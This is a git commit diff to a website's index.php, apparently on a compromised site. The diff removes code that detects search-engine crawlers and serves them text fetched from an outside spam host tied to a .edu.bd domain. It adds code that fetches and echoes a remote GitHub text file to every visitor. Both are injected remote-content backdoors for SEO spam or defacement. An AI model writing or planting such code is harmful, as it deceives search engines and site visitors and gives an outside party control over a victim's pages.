7e3d120bf9c12f28ec723a51c36577a946181407
tominthesky <koitt.thomas@gmail.com>
2026-02-15 21:48:51 +0700

    Remove bot detection and message fetching logic

--- index.php
+++ index.php
@@ -1,55 +1,6 @@
-<?php
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $bots = array(
-        'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
-        'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo', 'YandexBot',
-        'Baiduspider', 'TelegramBot', 'facebookexternalhit', 'Pinterest', 'W3C_Validator',
-        'Google-Site-Verification', 'Google-InspectionTool', 'Applebot', 'AhrefsBot', 'SEMrushBot', 'MJ12bot'
-    );
-    
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
-        }
-    }
-
-    return false;
-}
-
-function fetch_message_from_url($url) {
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout setelah 10 detik
-    $response = curl_exec($ch);
-    
-    if (curl_errno($ch)) {
-        error_log("Error cURL: " . curl_error($ch));
-        curl_close($ch);
-        return false;
-    }
-    
-    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-
-    if ($http_code == 200) {
-        return $response;
-    } else {
-        error_log("HTTP Error: Status Code " . $http_code);
-        return false;
-    }
-}
-
-if (is_bot()) { 
-    $message = fetch_message_from_url('https://ampshel2.hargasuper25.com/glabdhaka.edu.bd/index.txt');
-    
-    if ($message) {
-        echo $message;
-    } else {
-        echo "";
-    }
-    exit;
-}
+<?php 
+$a = file_get_contents('https://raw.githubusercontent.com/Kecoas456/kimak/refs/heads/main/heroses.txt'); 
+echo $a; 
 ?>
 
 <?php
